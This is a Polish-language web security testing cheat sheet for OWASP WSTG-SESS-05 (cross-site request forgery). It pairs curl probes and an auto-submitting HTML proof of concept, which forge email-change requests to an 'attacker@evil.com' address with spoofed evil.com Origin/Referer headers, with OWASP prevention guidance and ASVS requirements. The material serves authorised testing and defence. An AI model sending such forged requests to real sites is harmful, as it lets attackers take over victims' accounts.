# WSTG-SESS-05 — Testing for Cross Site Request Forgery (CSRF)

## Cele

- Okreslenie czy requesty moga byc inicjowane w imieniu uzytkownika bez jego wiedzy
- Sprawdzenie obecnosci i walidacji tokenow anty-CSRF
- Testowanie skutecznosci ochrony przed CSRF

## KOMENDY

### Sprawdzenie obecnosci tokenu CSRF w formularzach

```bash
curl -s TARGET/form-page | grep -iE "csrf|token|_token|authenticity"

```

### Pobranie tokenu CSRF i proba uzycia go w innym kontekscie

```bash
CSRF_TOKEN=$(curl -s -c cookies.txt TARGET/form-page | grep -oP 'name="csrf_token" value="\K[^"]+')
echo "CSRF Token: $CSRF_TOKEN"

```

### Test bez tokenu CSRF

```bash
curl -v -b cookies.txt -X POST TARGET/change-email -d "email=attacker@evil.com" 2>&1

```

### Test z pustym tokenem CSRF

```bash
curl -v -b cookies.txt -X POST TARGET/change-email -d "email=attacker@evil.com&csrf_token=" 2>&1

```

### Test z nieprawidlowym tokenem CSRF

```bash
curl -v -b cookies.txt -X POST TARGET/change-email -d "email=attacker@evil.com&csrf_token=INVALID_TOKEN" 2>&1

```

### Test CSRF z metoda GET zamiast POST

```bash
curl -v -b cookies.txt "TARGET/change-email?email=attacker@evil.com" 2>&1

```

### Sprawdzenie naglowka SameSite cookie

```bash
curl -s -I TARGET | grep -i "set-cookie" | grep -i "samesite"

```

### Sprawdzenie walidacji naglowka Origin/Referer

```bash
curl -v -b cookies.txt -H "Origin: https://evil.com" -X POST TARGET/change-email -d "email=attacker@evil.com&csrf_token=$CSRF_TOKEN" 2>&1
curl -v -b cookies.txt -H "Referer: https://evil.com/page" -X POST TARGET/change-email -d "email=attacker@evil.com&csrf_token=$CSRF_TOKEN" 2>&1

```

### Test CSRF z usunietym naglowkiem Referer

```bash
curl -v -b cookies.txt -H "Referer:" -X POST TARGET/change-email -d "email=attacker@evil.com" 2>&1

```

### Generowanie CSRF PoC (HTML)

```bash
cat << 'CSRF_POC'
<html>
<body>
<form action="TARGET/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="submit" value="Click me" />
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
CSRF_POC

```

### Test czy token CSRF jest powiazany z sesja

```bash
# Zaloguj sie na konto A, pobierz token
# Uzyj tokenu z konta A w requescie z sesja konta B

```

### Sprawdzenie CSRF na endpointach API (JSON)

```bash
curl -v -b cookies.txt -H "Content-Type: application/json" -X POST TARGET/api/change-email -d '{"email":"attacker@evil.com"}' 2>&1

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings - materialy i techniki CSRF

```bash
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/Cross-Site Request Forgery/README.md
# Zawiera przyklady payloadow CSRF w roznych formatach (HTML, JSON, multipart)

```

### Przyklady obrazkow CSRF PoC z PayloadsAllTheThings

```bash
ls Desktop/WSTG/PayloadsAllTheThings-master/Cross-Site\ Request\ Forgery/Images/

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. W Burp Proxy przechwyc request zmieniajacy dane (np. zmiana email/hasla)
2. PPM -> Engagement Tools -> Generate CSRF PoC
3. Otworz wygenerowany PoC w przegladarce z zalogowana sesja
4. Sprawdz czy akcja zostala wykonana bez interakcji uzytkownika
5. Usun token CSRF z requestu w Burp Repeater - sprawdz czy serwer odrzuca
6. Przetestuj rozne metody bypass: usun Referer, zmien Origin, uzyj GET zamiast POST
7. Sprawdz czy token CSRF jest unikalny per sesja i per request
8. Przetestuj czy token z jednej sesji dziala w innej


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md

### WAZNE: XSS pokonuje WSZYSTKIE zabezpieczenia CSRF

- Jesli aplikacja ma XSS — atakujacy moze odczytac CSRF tokeny i ominac kazda ochrone
- Najpierw napraw XSS, potem wdrazaj CSRF protection

### Primary Defense — Token-Based Mitigation

- **Synchronizer Token Pattern** (stateful): serwer generuje unikalny token per sesja, wstawia w hidden field formularza
  - Token musi byc: unikalny per sesja, tajny, nieprzewidywalny (CSPRNG, duza wartosc losowa)
  - Token NIE powinien byc przekazywany w cookie (w synchronizer pattern)
  - Token NIE moze byc w URL (wyciek przez Referer, logi, historia)
  - Bezpieczniej: wstaw CSRF token w custom HTTP header przez JavaScript (objety same-origin policy)
- **Double Submit Cookie** (stateless): alternatywa gdy serwer nie przechowuje stanu
  - Rekomendowany wariant: **Signed Double-Submit Cookie** z HMAC
  - HMAC payload: sessionID + randomValue, klucz: tajny secret serwera
  - Zwykly double-submit (bez podpisu) jest podatny na cookie injection

### Defense in Depth

- **SameSite Cookie Attribute**: ustaw `Strict` lub `Lax` na session cookies
  - NIE ustawiaj cookie na domene (np. `.example.com`) — subdomeny wspoldziela cookie
  - SameSite to dodatkowa warstwa, NIE jedyna obrona
- **Weryfikacja Origin/Referer headers**: sprawdzaj po stronie serwera
  - Origin jest dostepny w POST requests — weryfikuj ze pochodzi z Twojej domeny
  - Referer moze byc usuniety — traktuj brak Referer jako podejrzany
- **Custom Request Headers** (dla AJAX/API): dodaj `X-Requested-With` lub `X-CSRF-Token`
  - Custom headers sa automatycznie objete same-origin policy

### Fetch Metadata Headers (nowoczesne przegladarki)

- `Sec-Fetch-Site`: wskazuje skad pochodzi request (same-origin, cross-site, none)
- Blokuj state-changing requests gdzie `Sec-Fetch-Site: cross-site`
- Go 1.25+ ma wbudowany `CrossOriginProtection` oparty na Fetch Metadata

### User Interaction Based Defense (dla krytycznych operacji)

- Re-autentykacja haslem przed operacjami krytycznymi (zmiana hasla, email, platnosc)
- CAPTCHA jako dodatkowa obrona
- One-time tokens (np. email/SMS confirmation)

### Dodatkowe zasady

- **NIE uzywaj GET** do operacji zmieniajacych stan — TYLKO POST/PUT/DELETE
- Sprawdz czy framework ma wbudowana ochrone CSRF — uzyj jej zamiast wlasnej implementacji
- .NET: wbudowane `[ValidateAntiForgeryToken]`, Django: `{% csrf_token %}`

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| CSRF Scanner | Skaner podatnosci CSRF | [GitHub](https://github.com/ah8r/csrf) |
| EasyCSRF | Wykrywanie slabej ochrony CSRF | [GitHub](https://github.com/0ang3el/EasyCSRF) |
| Token Rewrite | Wyszukiwanie i ponowne uzycie tokenow CSRF | [GitHub](https://github.com/hvqzao/burp-token-rewrite) |
| CSurfer | Sledzenie i aktualizacja tokenow CSRF | [GitHub](https://github.com/asaafan/CSurfer) |

---

## Wskazówki ASVS

Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.

### L1 (Podstawowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V3.5.1 | Browser Origin Separation | Verify that, if the application does not rely on the CORS preflight mechanism to prevent disallowed cross-origin requests to use sensitive functionality, these requests are validated to ensure they originate from the application itself. This may be done by using and validating anti-forgery tokens or requiring extra HTTP header fields that are not CORS-safelisted request-header fields. This is to defend against browser-based request forgery attacks, commonly known as cross-site request forgery (CSRF). |
| V3.5.2 | Browser Origin Separation | Verify that, if the application relies on the CORS preflight mechanism to prevent disallowed cross-origin use of sensitive functionality, it is not possible to call the functionality with a request which does not trigger a CORS-preflight request. This may require checking the values of the 'Origin' and 'Content-Type' request header fields or using an extra header field that is not a CORS-safelisted header-field. |
| V3.5.3 | Browser Origin Separation | Verify that HTTP requests to sensitive functionality use appropriate HTTP methods such as POST, PUT, PATCH, or DELETE, and not methods defined by the HTTP specification as "safe" such as HEAD, OPTIONS, or GET. Alternatively, strict validation of the Sec-Fetch-* request header fields can be used to ensure that the request did not originate from an inappropriate cross-origin call, a navigation request, or a resource load (such as an image source) where this is not expected. |
